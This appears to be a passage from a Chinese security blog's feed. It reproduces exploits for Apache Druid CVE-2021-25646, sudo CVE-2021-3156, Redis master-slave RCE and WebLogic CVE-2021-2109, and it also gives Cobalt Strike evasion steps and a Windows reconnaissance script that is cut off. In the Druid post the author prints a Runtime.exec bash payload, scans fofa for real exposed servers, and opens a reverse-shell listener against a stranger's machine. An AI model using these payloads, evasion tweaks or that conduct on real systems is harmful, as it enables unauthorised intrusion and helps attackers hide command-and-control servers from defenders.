Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping dns.com&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br></pre></td></tr></table></figure><p>在<code>/tmp</code>目录下创建一个新的<code>test</code>文件夹。</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181726708"></p><p>攻击成功。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>建议广大用户及时更新Apache Druid，下载链接为：</p><p><a href="https://druid.apache.org/downloads.html">https://druid.apache.org/downloads.html</a></p><p><a href="https://github.com/apache/druid/releases/tag/druid-0.20.1">https://github.com/apache/druid/releases/tag/druid-0.20.1</a></p><h3 id="实战环节"><a href="#实战环节" class="headerlink" title="实战环节"></a>实战环节</h3><p>复现完了，就开始实战，想看看还有没有人漏网之鱼。于是乎上了神器<code>fofa</code>就是一顿搜索，</p><p><img src="/images/image-20210205143455851.png" alt="image-20210205143455851"></p><p>遇到的都是这样的，<code>load data</code>点击不了，只好放弃。</p><p><img src="/images/image-20210205143543088.png" alt="image-20210205143543088"></p><p>翻着翻着，就看到一条漏网之鱼，下面还温馨的告诉运行的版本号是<code>0.17.1</code>，这不是刚好符合漏洞版本。</p><p><img src="/images/image-20210205143600088.png" alt="image-20210205143600088"></p><p>先去DNSLog看一下，是否存在漏洞。多看了几遍。。。</p><p><img src="/images/image-20210205144918650.png" alt="image-20210205144918650"></p><p>那就可以反弹shell了嘛。最近腾讯云搞活动，贵了，以前学生9元钱一个月，现在最低买三个月，只好用ngrok做个端口转发</p><p><img src="/images/image-20210205144054231.png" alt="image-20210205144054231"></p><p>运行./sunny clientid 隧道id</p><p><img src="/images/mbxr1YNnM5pg9AK.png" alt="image-20210205144134603"></p><p>本地监听3333端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 3333</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210205144204339.png" alt="image-20210205144204339"></p><p>看情况是个人VPS到此收工。没有什么好继续进行的了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Druid未授权命令执行-CVE-2021-25646&quot;&gt;&lt;a href=&quot;#Apache-Druid未授权命令执行-CVE-2021-25646&quot; class=&quot;headerlink&quot; title=&quot;Apache Druid未授权命令执行(CVE-</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux sudo提权(CVE-2021-3156)</title>
    <link href="http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/"/>
    <id>http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/</id>
    <published>2021-02-02T09:25:02.000Z</published>
    <updated>2021-02-04T05:21:57.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-sudo-权限提升-CVE-2021-3156"><a href="#Linux-sudo-权限提升-CVE-2021-3156" class="headerlink" title="Linux sudo 权限提升(CVE-2021-3156)"></a>Linux sudo 权限提升(CVE-2021-3156)</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote><p>sudo 1.8.2 ~ 1.8.31p2</p><p>sudo 1.9.0 ~ 1.9.5p1</p></blockquote><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>以非 root 用户执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="/images/image-20210202175040378.png" alt="image-20210202175040378"></p><p>不存在漏洞</p><p><img src="/images/yErg56.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>工具：<a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p><p>编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>使用工具</p><p><img src="/images/image-20210202174235752.png" alt="image-20210202174235752"></p><p>提权成功</p><p><img src="/images/image-20210202174316368.png" alt="image-20210202174316368"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复升级到更新版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-sudo-权限提升-CVE-2021-3156&quot;&gt;&lt;a href=&quot;#Linux-sudo-权限提升-CVE-2021-3156&quot; class=&quot;headerlink&quot; title=&quot;Linux sudo 权限提升(CVE-2021-3156)&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="Linux提权" scheme="http://example.com/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike特征修改</title>
    <link href="http://example.com/2021/01/31/CobaltStrike%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/"/>
    <id>http://example.com/2021/01/31/CobaltStrike%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</id>
    <published>2021-01-31T01:03:16.000Z</published>
    <updated>2021-02-04T03:29:09.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cobalt-Strike-修改特征"><a href="#Cobalt-Strike-修改特征" class="headerlink" title="Cobalt Strike 修改特征"></a>Cobalt Strike 修改特征</h2><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>修改默认端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130155505498.png" alt="image-20210130155505498"></p><p>将其中的server_port改成任意不冲突端口即可</p><h4 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a>证书特征</h4><p>查看当前证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store </span><br></pre></td></tr></table></figure><p>输入默认密码123456回车，可以看到所有者、发布者中Cobalt Strike相关字样</p><p><img src="/images/image-20210130161238972.png" alt="image-20210130161238972"></p><p>通过fofa直接能搜到很多cobaltstrike的vps</p><p><img src="/images/image-20210130161652476.png" alt="image-20210130161652476"></p><p>使用nmap扫描指定ip的证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script ssl-cert &lt;target_ip&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130162033753.png" alt="image-20210130162033753"></p><p>使用Keytools工具修改证书信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keytool ‐keystore cobaltstrike.store ‐storepass 密码 ‐keypass 密码 ‐genkey ‐key</span><br><span class="line">alg RSA ‐alias google.com ‐dname &quot;CN&#x3D;(名字与姓氏), OU&#x3D;(组织单位名称), O&#x3D;(组织名</span><br><span class="line">称), L&#x3D;(城市或区域名称), ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;</span><br><span class="line"></span><br><span class="line">keytool -keystore cobaltstrike.store --storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;US, OU&#x3D;baidu.com, O&#x3D;Sofware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure><p>可以看到修改证书信息之后，再也没有cobaltstrike 的关键字了。</p><p><img src="/images/image-20210130162519952.png" alt="image-20210130162519952"></p><p><img src="/images/image-20210130162635505.png" alt="image-20210130162635505"></p><h4 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h4><p>太重复了，就不多写了。贴出一个写的比较详细的</p><p><a href="https://www.secpulse.com/archives/148377.html">https://www.secpulse.com/archives/148377.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cobalt-Strike-修改特征&quot;&gt;&lt;a href=&quot;#Cobalt-Strike-修改特征&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike 修改特征&quot;&gt;&lt;/a&gt;Cobalt Strike 修改特征&lt;/h2&gt;&lt;h4 id=&quot;端</summary>
      
    
    
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Redis主从复制GetShell</title>
    <link href="http://example.com/2021/01/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell/"/>
    <id>http://example.com/2021/01/30/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell/</id>
    <published>2021-01-30T02:45:13.000Z</published>
    <updated>2021-02-04T05:08:18.072Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis主从复制GetShell"><a href="#Redis主从复制GetShell" class="headerlink" title="Redis主从复制GetShell"></a>Redis主从复制GetShell</h1><a id="more"></a><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用dockers下载redis5.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull damonevking&#x2F;redis5.0</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 -d damonevking&#x2F;redis5.0 redis-server   &#x2F;&#x2F;映射端口并运行容器</span><br></pre></td></tr></table></figure><p>在攻击机上执行</p><ul><li><a href="https://github.com/Ridter/redis-rce.git">https://github.com/Ridter/redis-rce.git</a></li><li><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> 下载exp.so，并复制到上一个文件加中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 192.168.0.5 -L 192.168.0.8 -f exp.so</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210130110621195.png" alt="image-20210130110621195"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redis主从复制GetShell&quot;&gt;&lt;a href=&quot;#Redis主从复制GetShell&quot; class=&quot;headerlink&quot; title=&quot;Redis主从复制GetShell&quot;&gt;&lt;/a&gt;Redis主从复制GetShell&lt;/h1&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-2019</title>
    <link href="http://example.com/2021/01/24/Weblogic%20CVE-2021-2109%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/01/24/Weblogic%20CVE-2021-2109%20RCE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-24T12:57:20.000Z</published>
    <updated>2021-01-25T01:52:53.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Weblogic-CVE-2021-2109-RCE复现"><a href="#Weblogic-CVE-2021-2109-RCE复现" class="headerlink" title="Weblogic CVE-2021-2109 RCE复现"></a>Weblogic CVE-2021-2109 RCE复现</h2><h3 id="Weblogic-介绍"><a href="#Weblogic-介绍" class="headerlink" title="Weblogic 介绍"></a>Weblogic 介绍</h3><p>Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><a id="more"></a><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>WebLogic 10.3.6.0.0</p><p>WebLogic 12.1.3.0.0</p><p>WebLogic 12.2.1.3.0</p><p>WebLogic 12.2.1.4.0</p><p>WebLogic 14.1.1.0.0</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>weblogic下载地址</strong>：<a href="https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html">https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html</a></p><p>将下载下来的weblogic解压，以管理员身份运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fmw_14.1.1.0.0_wls_lite_quick_generic.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094505.png" alt="image-20210124201521669"></p><p>此时，已经安装好了，会在当前目录下生成一个文件夹<code>wls1411</code>。</p><p>打开目录<code>F:\Program_Files\weblogic\wls1411\oracle_common\common\bin</code>，运行<code>config.cmd</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094934.png" alt="image-20210124201800268"></p><p>默认下一步即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094951.png" alt="image-20210124201917340"></p><p>上面配置号后，会在<code>wls1411</code>文件夹下生成一个新的<code>user_projects</code>文件夹，在其下面<code>domains\base_domain\</code>中运行<code>startWebLogic.cmd</code>就可以启动<code>weblogic</code>服务。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094812.png" alt="image-20210124202305770"></p><p>访问本地<code>http://127.0.0.1:7001/console/login/LoginForm.jsp</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125094813.png" alt="image-20210124202355447"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>利用条件：</strong>需要知道登录密码</p><p><strong>使用的工具</strong></p><p><strong>JNDI-Injection-Exploit</strong>：<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar">https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</a></p><p><strong>CVE-2021-2109.py</strong>：<a href="https://www.exploit-db.com/exploits/49461">https://www.exploit-db.com/exploits/49461</a></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images20210125095104.png" alt="image-20210124202724619"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>赶紧打上补丁。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Weblogic-CVE-2021-2109-RCE复现&quot;&gt;&lt;a href=&quot;#Weblogic-CVE-2021-2109-RCE复现&quot; class=&quot;headerlink&quot; title=&quot;Weblogic CVE-2021-2109 RCE复现&quot;&gt;&lt;/a&gt;Weblogic CVE-2021-2109 RCE复现&lt;/h2&gt;&lt;h3 id=&quot;Weblogic-介绍&quot;&gt;&lt;a href=&quot;#Weblogic-介绍&quot; class=&quot;headerlink&quot; title=&quot;Weblogic 介绍&quot;&gt;&lt;/a&gt;Weblogic 介绍&lt;/h3&gt;&lt;p&gt;Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Weblogic" scheme="http://example.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>windows信息收集</title>
    <link href="http://example.com/2020/12/17/windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2020/12/17/windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-12-17T14:54:36.000Z</published>
    <updated>2020-12-17T14:59:10.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-信息收集"><a href="#Windows-信息收集" class="headerlink" title="Windows 信息收集"></a>Windows 信息收集</h1><p>作为一个想偷懒的人，必然就想写个脚本对信息收集，免得自己丢三落四。然而，知道python打包的exe文件大，不知道这么大。于是只有个半成品。</p><a id="more"></a><p>python 源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> <span class="built_in">compile</span>, sub, DOTALL</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getInformation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.hostName = <span class="literal">None</span></span><br><span class="line">        self.registerName = <span class="literal">None</span></span><br><span class="line">        self.domainWork = <span class="literal">None</span></span><br><span class="line">        self.patches = <span class="literal">None</span></span><br><span class="line">        self.allUser = <span class="literal">None</span></span><br><span class="line">        self.OnlineUser = <span class="literal">None</span></span><br><span class="line">        self.currentUser = <span class="literal">None</span></span><br><span class="line">        self.currentUserGroup = <span class="literal">None</span></span><br><span class="line">        self.AVName = <span class="literal">None</span></span><br><span class="line">        self.shareList = <span class="literal">None</span></span><br><span class="line">        self.OS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">userOpt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取所有用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net user&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?---\r\n(.*?)命令成功&#x27;</span></span><br><span class="line">        allUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        allUser = allUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        allUser = sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; | &#x27;</span>, allUser)</span><br><span class="line">        <span class="comment"># print(allUser)</span></span><br><span class="line">        self.allUser = allUser</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询当前用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;whoami&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?\\(.*?)\r\n&#x27;</span></span><br><span class="line">        currentUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        currentUser = currentUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.currentUser = currentUser</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查询当前用户所属组</span></span><br><span class="line">        response = Popen(<span class="string">&quot;net user &quot;</span>+self.currentUser, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?本地组成员 \s+(\*.*?)\r\n&#x27;</span></span><br><span class="line">        currentUserGroups = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        currentUserGroup = currentUserGroups.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.currentUserGroup = currentUserGroup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查询在线用户</span></span><br><span class="line">        response = Popen(<span class="string">&quot;query user | quser&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?&gt;(.*?) &#x27;</span></span><br><span class="line">        OnlineUsers = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        OnlineUser = OnlineUsers.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        self.OnlineUser = OnlineUser</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SystemInfo</span>(<span class="params">self</span>):</span></span><br><span class="line">        response = Popen(<span class="string">&quot;systeminfo&quot;</span>, shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">        result = response.stdout.read().decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取主机名</span></span><br><span class="line">        pattern1 = <span class="string">r&#x27;.*?主机名:\s+(.*?)\r\n&#x27;</span></span><br><span class="line">        hostNames = <span class="built_in">compile</span>(pattern1, DOTALL)</span><br><span class="line">        hostName = hostNames.findall(result)</span><br><span class="line">        self.hostName = hostName[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取用户名</span></span><br><span class="line">        pattern2 = <span class="string">r&#x27;.*?注册的所有人:   (.*?)\r\n&#x27;</span></span><br><span class="line">        registerNames = <span class="built_in">compile</span>(pattern2, DOTALL)</span><br><span class="line">        registerName = registerNames.findall(result)</span><br><span class="line">        self.registerName = registerName[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取工作组名或域名</span></span><br><span class="line">        pattern3 = <span class="string">r&#x27;.*?域:\s+(.*?)\r\n&#x27;</span></span><br><span class="line">        domainWorks = <span class="built_in">compile</span>(pattern3, DOTALL)</span><br><span class="line">        domainWork = domainWorks.findall(result)</span><br><span class="line">        self.domainWork = domainWork[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取补丁信息</span></span><br><span class="line">        pattern4 = <span class="string">r&#x27;.*?\[\d+\]: (KB\d&#123;7&#125;)\r\n&#x27;</span></span><br><span class="line">        patches = <span class="built_in">compile</span>(pattern4, DOTALL)</span><br><span class="line">        patchName = patches.findall(result)</span><br><span class="line">        self.patches = patchName</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取OS名称和版本</span></span><br><span class="line">        pattern5 = <span class="string">r&#x27;.*?OS 名称:\s+ (.*?)\r\nOS&#x27;</span></span><br><span class="line">        OS = <span class="built_in">compile</span>(pattern5, DOTALL)</span><br><span class="line">        OSName = OS.findall(result)[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        pattern6 = <span 